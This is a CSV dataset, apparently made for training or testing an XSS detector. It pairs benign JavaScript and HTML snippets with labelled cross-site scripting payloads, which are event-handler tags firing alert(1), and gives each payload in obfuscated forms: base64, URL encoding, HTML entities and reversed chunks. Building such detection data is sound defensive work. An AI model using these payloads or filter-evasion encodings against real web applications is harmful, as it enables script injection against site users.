sample_id,label,payload_original,payload_obfuscated,generator,recipe
3608,1,"<style onmouseout=""alert(1)"">test</style>",PHN0eWxlIG9ubW91c2VvdXQ9ImFsZXJ0KDEpIj50ZXN0PC9zdHlsZT4=,llm_style_t1.0,base64
3609,1,"<tbody onmouseup=""alert(1)"">test</tbody>",%253Ctbody%2520onmouseup%253D%2522alert%25281%2529%2522%253Etest%253C%252Ftbody%253E,llm_style_t1.0,double_urlencode+html_entities
3610,0,return normalizedata(element.getattribute(`data-bs-${normalizedatakey(key)}`)); } };,return normalizedata(element.getattribute(`data-bs-${normalizedatakey(key)}`)); } };,llm_style_t1.0,none
3611,0,"}; this._queuecallback(complete, this.tip, this._isanimated()); }","}; this._queuecallback(complete, this.tip, this._isanimated()); }",llm_style_t1.0,none
3612,1,"<element draggable=""true"" ondragleave=""alert(1)"">test</element>",%3Celement%20draggable%3D%22true%22%20ondragleave%3D%22alert%281%29%22%3Etest%3C%2Felement%3E,llm_style_t1.0,urlencode
3613,1,<audio onpointerleave=alert(1)>xss</audio>,%3Caudio%20onpointerleave%3Dalert%281%29%3Exss%3C%2Faudio%3E,llm_style_t1.0,urlencode+html_entities
3614,0,} pause() { clearinterval(this.interval);,} pause() { clearinterval(this.interval);,llm_style_t1.0,none
3615,0,if (img.length) { $el.prepend(img); },if (img.length) { $el.prepend(img); },llm_style_t1.0,none
3616,1,<keygen id=x onfocusin=alert(1)>,%26lt%3Bkeygen%20id%3Dx%20onfocusin%3Dalert%281%29%26gt%3B,llm_style_t1.0,html_then_urlencode
3617,1,"<div draggable=""true"" contenteditable>drag me</div><output ondragover=alert(1) contenteditable>drop here</output>",%25253Cdiv%252520draggable%25253D%252522true%252522%252520contenteditable%25253Edrag%252520me%25253C%25252Fdiv%25253E%25253Coutput%252520ondragover%25253Dalert%2525281%252529%252520contenteditable%25253Edrop%252520here%25253C%25252Foutput%25253E,llm_style_t1.0,double_urlencode+urlencode
3618,0,"title: 'text input fields', body: 'text fields allow user input. the border should light up simply and clearly indicating which field the user is currently editing.' });","title: 'text input fields', body: 'text fields allow user input. the border should light up simply and clearly indicating which field the user is currently editing.' });",llm_style_t1.0,none
3619,0,prop = getprefixedprop(prop),prop = getprefixedprop(prop),llm_style_t1.0,none
3620,0,this._haskeyboardinteraction = isinteracting break },this._haskeyboardinteraction = isinteracting break },llm_style_t1.0,none
3621,1,"<s onbeforecut=""alert(1)"" contenteditable>test</s>",&lt;s onbeforecut=&quot;alert(1)&quot; contenteditable&gt;test&lt;/s&gt;,llm_style_t1.0,html_entities+comment_marker
3622,1,"<iframe onkeyup=""alert(1)"" contenteditable>test</iframe>",PGlmcmFtZSBvbmtleXVwPSJhbGVydCgxKSIgY29udGVudGVkaXRhYmxlPnRlc3Q8L2lmcmFtZT4=,llm_style_t1.0,comment_marker+base64
3623,0,el = this.images[this._wrap(this.center)]; let transformstring = `${alignment} translatex(${-delta / 2}px) translatex(${dir * this.options.shift *,el = this.images[this._wrap(this.center)]; let transformstring = `${alignment} translatex(${-delta / 2}px) translatex(${dir * this.options.shift *,llm_style_t1.0,none
3624,0,"this.$pmbtn = $('<div class=""pm-btn"">pm</div>'); this.$ambtn.on('click', this._handleampmclick.bind(this)).appendto(this.spanampm); this.$pmbtn.on('click', this._handleampmclick.bind(this)).appendto(this.spanampm);","this.$pmbtn = $('<div class=""pm-btn"">pm</div>'); this.$ambtn.on('click', this._handleampmclick.bind(this)).appendto(this.spanampm); this.$pmbtn.on('click', this._handleampmclick.bind(this)).appendto(this.spanampm);",llm_style_t1.0,none
3625,0,import carousel from './src/carousel.js',import carousel from './src/carousel.js',llm_style_t1.0,none
3626,0,_handlerangeinputmousemovetouchmove() {,_handlerangeinputmousemovetouchmove() {,llm_style_t1.0,none
3627,1,<header id=x tabindex=1 onactivate=alert(1)></header>,<header id=x tabindex=1 onactivate=alert(1)></header>  ,llm_style_t1.0,whitespace_noise
3628,1,"<applet draggable=""true"" ondragleave=""alert(1)"">test</applet>",%253Capplet%2520draggable%253D%2522true%2522%2520ondragleave%253D%2522alert%25281%2529%2522%253Etest%253C%252Fapplet%253E,llm_style_t1.0,double_urlencode
3629,0,for (var registration of registrations) { registration.unregister() .then(function () {,for (var registration of registrations) { registration.unregister() .then(function () {,llm_style_t1.0,none
3630,1,"<style>@keyframes x{}</style><br style=""animation-name:x"" onanimationend=""alert(1)""></br>",PHN0eWxlPkBrZXlmcmFtZXMgeHt9PC9zdHlsZT48YnIgc3R5bGU9ImFuaW1hdGlvbi1uLypPQkYqL2FtLypPQkYqL2U6eCIgb25hbmltYXRpb25lbmQ9ImFsZXJ0KDEpIj48L2JyPg==,llm_style_t1.0,comment_marker+base64
3631,0,) { e.preventdefault(); this.selectchip(this.chipsdata.length - 1);,) { e.preventdefault(); this.selectchip(this.chipsdata.length - 1);,llm_style_t1.0,none
3632,0,return; } this.isopen = false;,return; } this.isopen = false;,llm_style_t1.0,none
3633,0,} static get name() { return name$8;,} static get name() { return name$8;,llm_style_t1.0,none
3634,1,"<style>@keyframes x{}</style><optgroup style=""animation-name:x"" onanimationend=""alert(1)""></optgroup>",PHN0eWxlPkBrZXlmcmFtZXMgeHt9PC9zdHlsZT48b3B0Z3JvdXAgc3R5bGU9ImFuaW1hdGlvbi1uYW1lOngiIG9uYW5pbWF0aW9uZW5kPSJhbGVydCgxKSI+PC9vcHRncm91cD4=,llm_style_t1.0,base64
3635,0,"<li class=""toclevel-2 tocsection-56""><a href=""#ethical_machines""><span class=""tocnumber"">8.3","<li class=""toclevel-2 tocsection-56""><a href=""#ethical_machines""><span class=""tocnumber"">8.3",llm_style_t1.0,none
3636,0,"if ('ontouchstart' in document.documentelement && !this._parent.closest(selector_navbar_nav)) { for (const element of [].concat(...document.body.children)) { eventhandler.on(element, 'mouseover', noop);","if ('ontouchstart' in document.documentelement && !this._parent.closest(selector_navbar_nav)) { for (const element of [].concat(...document.body.children)) { eventhandler.on(element, 'mouseover', noop);",llm_style_t1.0,none
3637,0,const name = 'carousel',const name = 'carousel',llm_style_t1.0,none
3638,0,value: function _animateoverlayout() { var _this34 = this; anim.remove(this._overlay);,value: function _animateoverlayout() { var _this34 = this; anim.remove(this._overlay);,llm_style_t1.0,none
3639,0,"this.el.removeeventlistener('click', this._handletabclickbound)","this.el.removeeventlistener('click', this._handletabclickbound)",llm_style_t1.0,none
3640,1,"<mark onmouseleave=""alert(1)"">test</mark>",%253Cmark%2520onmouseleave%253D%2522alert%25281%2529%2522%253Etest%253C%252Fmark%253E,llm_style_t1.0,comment_marker+double_urlencode
3641,1,"<div draggable=""true"" contenteditable>drag me</div><frame ondrop=alert(1) contenteditable>drop here</frame>","<div draggable=""true"" contenteditable>drag/*OBF*/ me/*OBF*/</div><frame ondrop=alert(1) contenteditable>drop here</frame>",llm_style_t1.0,comment_marker
3642,1,"<style>@keyframes slidein {}</style><param style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></param>",&lt;style&gt;@keyframes slidein {}&lt;/style&gt;&lt;param style=&quot;animation-duration:1s;animation-name:slidein;animation-iteration-count:2&quot; onanimationiteration=&quot;alert(1)&quot;&gt;&lt;/param&gt;,llm_style_t1.0,html_entities
3643,0,} _handletriggerclick(e) { let $trigger = $(e.target);,} _handletriggerclick(e) { let $trigger = $(e.target);,llm_style_t1.0,none
3644,1,<del onpointerover=alert(1)>xss</del>,%25253Cdel%252520onpointerover%25253Dalert%2525281%252529%25253Exss%25253C%25252Fdel%25253E,llm_style_t1.0,urlencode+whitespace_noise+double_urlencode
3645,1,"<isindex oncopy=""alert(1)"" contenteditable>test</isindex>","<isindex oncopy=""alert(  1)"" contenteditable>  test<  /isindex>",llm_style_t1.0,whitespace_noise
3646,0,_this46.addchip({ tag: val });,_this46.addchip({ tag: val });,llm_style_t1.0,none
3647,0,date = min; } else if (datepicker._isdate(max) && date > max) { date = max;,date = min; } else if (datepicker._isdate(max) && date > max) { date = max;,llm_style_t1.0,none
3648,0,"_appendoptionwithicon(select, option, type) { let disabledclass = option.disabled ? 'disabled ' : ''; let optgroupclass = type === 'optgroup-option' ? 'optgroup-option ' : '';","_appendoptionwithicon(select, option, type) { let disabledclass = option.disabled ? 'disabled ' : ''; let optgroupclass = type === 'optgroup-option' ? 'optgroup-option ' : '';",llm_style_t1.0,none
3649,0,if (showevent.defaultprevented) { return; },if (showevent.defaultprevented) { return; },llm_style_t1.0,none
3650,0,return v > max ? max : v,return v > max ? max : v,llm_style_t1.0,none
3651,0,return elementmap.get(element).get(key) || null } return null,return elementmap.get(element).get(key) || null } return null,llm_style_t1.0,none
3652,0,"to = math.max(to, reference[handlenumber - 1] + options.margin)","to = math.max(to, reference[handlenumber - 1] + options.margin)",llm_style_t1.0,none
3653,1,<img onblur=alert(1) tabindex=1 id=x></img><input autofocus>,focus>t auto><inpu></img1 id=xindex=1) tabalert(nblur=<img o,llm_style_t1.0,reverse_chunks
3654,0,} element.classlist.add(class_name_active); this._activate(selectorengine.getelementfromselector(element)); // search and activate/show the proper section,} element.classlist.add(class_name_active); this._activate(selectorengine.getelementfromselector(element)); // search and activate/show the proper section,llm_style_t1.0,none
3655,0,"scope_events[namespacedevent].push(callback); if ( namespacedevent.split('.')[0] === 'update' ) { scope_handles.foreach(function(a, index){","scope_events[namespacedevent].push(callback); if ( namespacedevent.split('.')[0] === 'update' ) { scope_handles.foreach(function(a, index){",llm_style_t1.0,none
3656,0,"this.xform = 'transform'; ['webkit', 'moz', 'o', 'ms'].every((prefix) => { var e = prefix + 'transform';","this.xform = 'transform'; ['webkit', 'moz', 'o', 'ms'].every((prefix) => { var e = prefix + 'transform';",llm_style_t1.0,none
3657,0,"<li><a href=""/wiki/inquiry"" title=""inquiry"">inquiry </a> </li>","<li><a href=""/wiki/inquiry"" title=""inquiry"">inquiry </a> </li>",llm_style_t1.0,none
3658,1,"<hr onmouseover=""alert(1)"">test</hr>",PGhyIG9ubW91c2VvdmVyPSJhbGVydCgxKSI+dGVzdDwvaHI+,llm_style_t1.0,base64
3659,0,"(function (global, factory) { typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory(require('../dom/event-handler.js'), require('../dom/selector-engine.js'), require('./config.js')) : typeof define === 'function' && define.amd ? define(['../dom/event-handler', '../dom/selector-engine', './config'], factory) :","(function (global, factory) { typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory(require('../dom/event-handler.js'), require('../dom/selector-engine.js'), require('./config.js')) : typeof define === 'function' && define.amd ? define(['../dom/event-handler', '../dom/selector-engine', './config'], factory) :",llm_style_t1.0,none
3660,0,"} function flip(_ref) { var state = _ref.state,","} function flip(_ref) { var state = _ref.state,",llm_style_t1.0,none
3661,1,<textarea onbeforecut=alert(1) autofocus>xss</textarea>,PHRleHRhcmVhIG9uYmVmb3JlY3V0PWFsZXJ0KDEpIGF1dG9mb2N1cz54c3M8L3RleHRhcmVhPg==,llm_style_t1.0,base64
3662,0,"var _getcomputedstyle = getcomputedstyle$1(element), overflow = _getcomputedstyle.overflow, overflowx = _getcomputedstyle.overflowx,","var _getcomputedstyle = getcomputedstyle$1(element), overflow = _getcomputedstyle.overflow, overflowx = _getcomputedstyle.overflowx,",llm_style_t1.0,none
3663,1,"<video onbeforepaste=""alert(1)"" contenteditable>test</video>",%3Cvideo%20onbeforepaste%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fvideo%3E,llm_style_t1.0,urlencode
3664,0,"_this48.$el.addclass(""direction-"" + _this48.options.direction)","_this48.$el.addclass(""direction-"" + _this48.options.direction)",llm_style_t1.0,none
3665,1,"<slot onmouseleave=""alert(1)"">test</slot>",&lt;slot onmouseleave=&quot;alert(1)&quot;&gt;test&lt;/slot&gt;,llm_style_t1.0,html_entities
3666,1,"<source onmouseover=""alert(1)"">test</source>",%26lt%3Bsource%20onmouseover%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Fsource%26gt%3B,llm_style_t1.0,html_then_urlencode+whitespace_noise
3667,0,return config } _maybeenablesmoothscroll() {,return config } _maybeenablesmoothscroll() {,llm_style_t1.0,none
3668,0,m.getoverflowparent = function(element) { if (element == null) { return null;,m.getoverflowparent = function(element) { if (element == null) { return null;,llm_style_t1.0,none
3669,0,function getparentnode(element) { if (getnodename(element) === 'html') { return element;,function getparentnode(element) { if (getnodename(element) === 'html') { return element;,llm_style_t1.0,none
3670,0,this._maybeschedulehide(); } _setlisteners() {,this._maybeschedulehide(); } _setlisteners() {,llm_style_t1.0,none
3671,0,const name = 'collapse',const name = 'collapse',llm_style_t1.0,none
3672,0,const class_name_showing = 'showing',const class_name_showing = 'showing',llm_style_t1.0,none
3673,1,"<style>@keyframes x{}</style><i style=""animation-name:x"" onanimationend=""alert(1)""></i>",%253Cstyle%253E%2540keyframes%2520x%257B%257D%253C%252Fstyle%253E%253Ci%2520style%253D%2522animation-name%253Ax%2522%2520onanimationend%253D%2522alert%25281%2529%2522%253E%253C%252Fi%253E,llm_style_t1.0,double_urlencode
3674,1,"<iframe onload=vbscript.encode:#@~^caaaaa==\ko$k6,foqiaaa==^#~@> <iframe language=vbscript.encode onload=#@~^caaaaa==\ko$k6,foqiaaa==^#~@>",%26lt%3Biframe%20onload%3Dvbscript.encode%3A%23%40~%5Ecaaaaa%3D%3D%5Cko%24k6%2Cfoqiaaa%3D%3D%5E%23~%40%26gt%3B%20%26lt%3Biframe%20language%3Dvbscript.encode%20onload%3D%23%40~%5Ecaaaaa%3D%3D%5Cko%24k6%2Cfoqiaaa%3D%3D%5E%23~%40%26gt%3B,llm_style_t1.0,html_entities+urlencode
3675,0,return xpct[j-1] + closest(,return xpct[j-1] + closest(,llm_style_t1.0,none
3676,1,"<address onmousedown=""alert(1)"">test</address>",&lt;address onmousedown=&quot;alert(1)&quot;&gt;test&lt;/address&gt;,llm_style_t1.0,whitespace_noise+html_entities
3677,1,"<style>@keyframes x{}</style><plaintext style=""animation-name:x"" onanimationend=""alert(1)""></plaintext>","<style>@keyframes x{}</style>  <plaintext style=""  animation-name:x""  onanimationend=""alert(1)""></plaintext>",llm_style_t1.0,whitespace_noise
3678,0,"this.options.onopenstart.call(this, $collapsibleli[0])","this.options.onopenstart.call(this, $collapsibleli[0])",llm_style_t1.0,none
3679,1,"<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class=""scroll-container"" onscrollsnapchanging=""alert(1)""> <* class=""scroll-item"">item 1</*><* class=""scroll-item"">item 2</*></*>","<style> .scroll-  container { overflow-x: scroll; scroll-snap-type:   x mandatory; display: flex; width: 300px; } .scroll-  item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item: first-child { animation:   sample;  animation-duration: 0.1s;   } @keyframes sample { 100% { scroll-snap-align: none; } }< /style><x class=""scroll-container"" onscrollsnapchanging=""alert(1)""> <  *  class=""scroll-item""  >item 1< /*> <* class=""scroll-item"">item 2</ *></*>",llm_style_t1.0,whitespace_noise
3680,1,"<isindex onmouseleave=""alert(1)"">test</isindex>",PGlzaW5kZXggb25tb3VzZWxlYXZlPSJhbGVydCgxKSI+dGVzdDwgL2lzaW5kZXg+,llm_style_t1.0,whitespace_noise+base64
3681,0,var isactive = $collapsibleli[0].classlist.contains('active'),var isactive = $collapsibleli[0].classlist.contains('active'),llm_style_t1.0,none
3682,1,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><area id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></area>",%26lt%3Bstyle%26gt%3B%40keyframes%20x%7Bfrom%20%7Bleft%3A0%3B%7Dto%20%7Bleft%3A%201000px%3B%7D%7D%3Atarget%20%7Banimation%3A10s%20ease-in-out%200s%201%20x%3B%7D%26lt%3B%2Fstyle%26gt%3B%26lt%3Barea%20id%3Dx%20style%3D%26quot%3Bposition%3Aabsolute%3B%26quot%3B%20onanimationcancel%3D%26quot%3Balert%281%29%26quot%3B%26gt%3B%26lt%3B%2Farea%26gt%3B,llm_style_t1.0,html_then_urlencode
3683,0,"""<a href=""/wiki/history_of_ai#the_golden_years_1956–1974"" class=""mw-redirect"" title=""history of ai"">golden years </a>"" of ai (successful symbolic reasoning programs 1956–1973):","""<a href=""/wiki/history_of_ai#the_golden_years_1956–1974"" class=""mw-redirect"" title=""history of ai"">golden years </a>"" of ai (successful symbolic reasoning programs 1956–1973):",llm_style_t1.0,none
